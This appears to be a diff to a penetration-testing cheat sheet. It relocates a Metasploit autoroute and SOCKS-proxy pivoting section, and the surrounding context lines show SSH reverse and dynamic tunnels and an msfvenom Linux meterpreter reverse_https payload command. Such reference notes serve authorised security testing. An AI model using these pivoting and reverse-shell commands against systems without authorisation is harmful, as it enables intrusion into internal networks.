@@ -1045,6 +1045,17 @@ ssh user@KillaOcean -R 127.0.0.1:5577:127.0.0.1:22
 ```
 <br>
 
+### autorun
+
+```
+post/multi/manage/autoroute
+set session x
+run
+
+auxiliary/server/socks_proxy
+```
+<br>
+
 ### Dynamic Port Forwarding:
 ```bash
 ssh -NfD 1080 user@KillaOcean
@@ -1375,16 +1386,7 @@ msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f 
 ```
 <br>
 
-### autorun
 
-```
-post/multi/manage/autoroute
-set session x
-run
-
-auxiliary/server/socks_proxy
-```
-<br>
 
 # Tools
 
